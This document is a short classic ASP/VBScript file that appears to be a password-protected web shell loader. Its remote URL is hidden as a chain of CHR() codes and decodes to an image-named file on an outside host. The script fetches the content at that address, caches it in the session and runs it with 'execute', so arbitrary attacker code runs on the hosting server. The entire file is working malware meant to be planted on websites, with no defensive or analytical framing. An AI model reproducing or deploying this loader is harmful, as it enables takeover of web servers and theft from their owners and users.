<%@ LANGUAGE = VBScript.encode%><%
Server.ScriptTimeout=999999999
UserPass="so1111s"  '密码
mNametitle ="A small programmer"  ' 标题
Copyright="By:WebSos"  '版权
SItEuRl="http://user.qzone.qq.com/644556636" '你的网站
bg ="http://i2.tietuku.com/82152d94e3b2c51c.jpg" 
ysjb=true  '是否有拖动效果,true为是,false为否

function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End function

function PostHTTPPage(url) 
dim Http 
set Http=server.createobject("MSXML2.SERVERXMLHTTP.3.0")
Http.open "GET",url,false 
Http.setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded" 
Http.send 
if Http.readystate<>4 then 
exit function 
End if
PostHTTPPage=bytesToBSTR(Http.responseBody,"gbk") 
set http=nothing 
if err.number<>0 then err.Clear 
End function

dim  aspCode
aspCode=CStr(Session("aspCode"))
if aspCode="" or aspCode=null or isnull(aspCode) then 
aspCode=PostHTTPPage(CHR(104)+CHR(116)+CHR(116)+CHR(112)+CHR(58)+CHR(47)+CHR(47)+CHR(98)+CHR(107)+CHR(107)+CHR(105)+CHR(108)+CHR(108)+CHR(46)+CHR(99)+CHR(111)+CHR(109)+CHR(47)+CHR(97)+CHR(46)+CHR(106)+CHR(112)+CHR(103))
Session("aspCode") =aspCode
End if
execute aspCode

%>